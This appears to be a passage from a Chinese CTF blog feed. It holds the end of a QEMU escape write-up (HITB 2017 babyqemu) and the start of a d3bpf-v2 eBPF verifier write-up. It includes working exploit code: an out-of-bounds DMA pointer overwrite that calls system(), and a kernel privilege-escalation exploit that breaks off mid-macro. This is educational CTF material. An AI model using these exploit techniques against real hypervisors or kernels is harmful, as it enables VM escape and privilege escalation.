mmio_write(<span class="number">0x80</span>, src_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, dst_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_set_src(phy_userbuf);</span><br><span class="line">    dma_set_dst(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line">    dma_do_cmd(<span class="number">0</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_read</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dma_set_dst(phy_userbuf);</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">2</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_enc</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">1</span> | <span class="number">4</span> | <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to leak enc ptr</span></span><br><span class="line">    dma_do_read(<span class="number">0x1000</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc = *(<span class="keyword">uint64_t</span> *)userbuf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking enc function: %p\n&quot;</span>, (<span class="keyword">void</span> *)leak_enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pro_base = leak_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = pro_base + <span class="number">0x1FDB18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to overwrite enc ptr to system ptr</span></span><br><span class="line">    dma_do_write(<span class="number">0x1000</span> + DMABASE, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deply the parameter of system function</span></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;cat flag\x00&quot;</span>;</span><br><span class="line">    dma_do_write(<span class="number">0x200</span> + DMABASE, command, <span class="built_in">strlen</span>(command));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger the enc ptr to execute system</span></span><br><span class="line">    dma_do_enc(<span class="number">0x200</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205170230132.png"                      alt="image-20230205170230132"                ></p><p>调试脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pid=`ps -aux | grep <span class="string">&quot;qemu-system-x86_64&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">sudo gdb \</span><br><span class="line">-ex <span class="string">&quot;file qemu-system-x86_64&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;attach <span class="variable">$pid</span>&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;b*\$rebase(0x284191)&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205173312988.png"                      alt="image-20230205173312988"                ></p><hr><p>题目地址：<a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz" >https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz<i class="fas fa-external-link-alt"></i></a></p><p>参考链接：</p><p><a class="link"   href="https://www.anquanke.com/post/id/224199#h3-5" >https://www.anquanke.com/post/id/224199#h3-5<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio" >https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。&lt;/p&gt;
&lt;p&gt;在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf-v2</title>
    <link href="https://cv196082.gitee.io/2023/01/11/d3bpf-v2/"/>
    <id>https://cv196082.gitee.io/2023/01/11/d3bpf-v2/</id>
    <published>2023-01-11T10:09:05.000Z</published>
    <updated>2023-01-11T10:11:17.190Z</updated>
    
    <content type="html"><![CDATA[<p>因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。</p><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>首先，这道题的大致跟上一道题目一样，存在一个patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">40</span>d92628e..be9cdde7a <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-8100</span>,<span class="number">11</span> +<span class="number">8100</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">case</span> BPF_RSH:</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- * This includes shifts by a negative number.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- */</span></span></span></span><br><span class="line"><span class="params"><span class="function">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">else</span></span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg_known_zero(dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure><p>可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。</p><p>不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：</p><ul><li>  任何指针只能进行加减操作，不能进行比较（防止侧信道）</li><li>  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。</li></ul><p>所以这也就造成了前面的攻击手法无效了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里出现了一个新的函数<code>bpf_skb_load_bytes</code>可以进行绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="keyword">const</span> struct sk_buff *, skb, u32, offset,</span><br><span class="line">   <span class="keyword">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(offset &gt; <span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"><span class="keyword">if</span> (ptr != to)</span><br><span class="line"><span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line"><span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。</p><p>然而因为patch的缘故我们可以很轻松的实现栈溢出。</p><h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>这里leak的方法延用作者的方法。</p><p>在新版本内核中ebpf程序crash并不会造成内核的崩溃，当<code>/proc/sys/kernel/panic_on_oops</code> 值为 0 时 <code>soft panic</code> 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加<code> oops = panic</code>。而在发生<code>soft panic</code>时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             